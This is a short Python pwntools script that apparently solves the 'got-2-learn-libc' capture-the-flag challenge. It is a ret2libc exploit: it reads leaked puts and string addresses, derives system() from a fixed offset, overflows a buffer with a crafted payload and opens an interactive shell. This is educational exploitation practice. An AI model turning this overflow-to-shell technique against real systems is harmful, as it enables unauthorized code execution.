#!/usr/bin/python2.7
from pwn import *

systemOffset = -149504

# we need puts and the shell address

proc = process('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln')
info = proc.recvuntil('puts: 0x')
puts = proc.recvuntil('\n')
print puts
putsAddr = int(puts, 16)

shell = proc.recvuntil('useful_string: 0x')
shell = proc.recvuntil('\n')
shellAddr = int(shell, 16)

system = putsAddr + systemOffset

payload = 'a'*(148+12) # For the overflow
payload += p32(system)
payload += 'aaaa'
payload += p32(shellAddr)

proc.sendline(payload)
proc.interactive()

